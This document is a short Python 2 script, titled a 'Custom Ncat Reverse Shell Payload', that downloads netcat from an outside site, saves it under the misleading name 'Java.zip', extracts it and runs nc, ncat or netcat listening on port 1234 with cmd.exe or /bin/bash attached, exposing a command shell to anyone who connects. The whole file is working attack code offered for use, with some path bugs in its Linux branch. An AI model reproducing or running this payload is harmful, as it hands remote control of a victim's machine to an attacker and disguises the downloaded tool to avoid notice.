#-------------------------------------------------------------------------------
# Name:        Custom Ncat Reverse Shell Payload
# Purpose:     Create a reverse connection using ncat
#
# Author:      Vasanth
#
# Created:     16/01/2015
# Copyright:   (c) Vasanth 2015
#-------------------------------------------------------------------------------
import os,platform,urllib,zipfile,os.path
from subprocess import check_output,call

def operatingSystem():
    return platform.system()

def attack():
    if ("indow" in operatingSystem()):
        call(os.getcwd()+"\\nc -l -p 1234 -e cmd.exe", shell=True)
        call(os.getcwd()+"\\ncat -l -p 1234 -e cmd.exe", shell=True)
        call(os.getcwd()+"\\netcat -l -p 1234 -e cmd.exe", shell=True)
    elif ("inux" in operatingSystem()):
        call(os.getcwd()+"\\nc -l -p 1234 -e /bin/bash", shell=True)
        call(os.getcwd()+"\\ncat -l -p 1234 -e /bin/bash", shell=True)
        call(os.getcwd()+"\\netcat -l -p 1234 -e /bin/bash", shell=True)

def NetCat():
    os.chdir('C:\\Users\\Vasanth')
    urllib.urlretrieve ("https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip", "Java.zip")#download ncat and save it as a Java.zip file
    zfile = zipfile.ZipFile("Java.zip")
    for name in zfile.namelist():
        (dirname, filename) = os.path.split(name)
        print "Decompressing " + filename + " on " + dirname
        if not os.path.exists(dirname):
            os.makedirs(dirname)
        zfile.extract(name, dirname)
    os.chdir(dirname)
    os.chdir(dirname)

def main():
    operatingSystem()
    NetCat()
    attack()
main()
